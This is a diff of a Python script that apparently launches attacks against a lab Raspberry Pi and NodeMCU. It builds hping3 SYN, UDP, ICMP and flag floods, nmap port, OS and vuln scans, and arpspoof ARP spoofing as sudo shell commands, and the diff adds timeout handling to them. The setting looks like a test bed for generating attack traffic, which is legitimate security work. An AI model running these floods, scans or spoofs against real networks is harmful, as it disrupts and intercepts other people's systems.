@@ -51,20 +51,20 @@ def run(command):
 # ---------- floods (hping3) ----------
 
 def syn_flood(pi, seconds):
-    run(f"timeout -s INT {seconds} sudo hping3 -S -p {MQTT_PORT} -i u1000 {pi}")
+    run(f"timeout --foreground -s INT {seconds} sudo hping3 -S -p {MQTT_PORT} -i u1000 {pi}")
 
 
 def udp_flood(pi, seconds):
-    run(f"timeout -s INT {seconds} sudo hping3 --udp -p {COAP_PORT} -d 8 -i u1000 {pi}")
+    run(f"timeout --foreground -s INT {seconds} sudo hping3 --udp -p {COAP_PORT} -d 8 -i u1000 {pi}")
 
 
 def icmp_flood(pi, seconds):
-    run(f"timeout -s INT {seconds} sudo hping3 --icmp -i u1000 {pi}")
+    run(f"timeout --foreground -s INT {seconds} sudo hping3 --icmp -i u1000 {pi}")
 
 
 def flag_flood(pi, seconds):
     flags = {"ack": "-A", "pshack": "-PA", "rstfin": "-RF"}.get(input("ack, pshack or rstfin? ").strip().lower(), "-A")
-    run(f"timeout -s INT {seconds} sudo hping3 {flags} -p {MQTT_PORT} -i u1000 {pi}")
+    run(f"timeout --foreground -s INT {seconds} sudo hping3 {flags} -p {MQTT_PORT} -i u1000 {pi}")
 
 
 # ---------- the other attacks ----------
@@ -72,13 +72,14 @@ def flag_flood(pi, seconds):
 def port_scan(pi, seconds):
     # -sT: normal connect scan (no sudo). In WSL mirrored mode "sudo nmap -sS" shows every port as "filtered",
     # because Windows keeps the replies. -sT still sends one SYN per port, so the Pi sees the scan.
+    # every scan stops after 30 s at most (after a block, nmap would otherwise wait for every port)
     kind = input("port, os or vuln scan? [port] ").strip().lower()
     if kind == "os":
-        run(f"sudo nmap -O {pi}")
+        run(f"timeout --foreground 30 sudo nmap -O --host-timeout 30s {pi}")
     elif kind == "vuln":
-        run(f"nmap --script vuln -p {MQTT_PORT} {pi}")
+        run(f"timeout 30 nmap --script vuln --host-timeout 30s -p {MQTT_PORT} {pi}")
     else:
-        run(f"nmap -sT -T4 -p 1-1024 {pi}")
+        run(f"timeout 30 nmap -sT -T4 --host-timeout 30s -p 1-1024 {pi}")
 
 
 def brute_force(pi, seconds):
@@ -104,7 +105,7 @@ def my_interface(pi):
 def arp_spoof(pi, seconds):
     victim = input("IP of the NodeMCU to pretend to be: ").strip()
     # -t {pi}: lie ONLY to the Pi: "{victim} is at my MAC". On stop, arpspoof sends the correct address back.
-    run(f"timeout -s INT {seconds} sudo arpspoof -i {my_interface(pi)} -t {pi} {victim}")
+    run(f"timeout --foreground -s INT {seconds} sudo arpspoof -i {my_interface(pi)} -t {pi} {victim}")
 
 
 def bot_attack(pi, seconds):
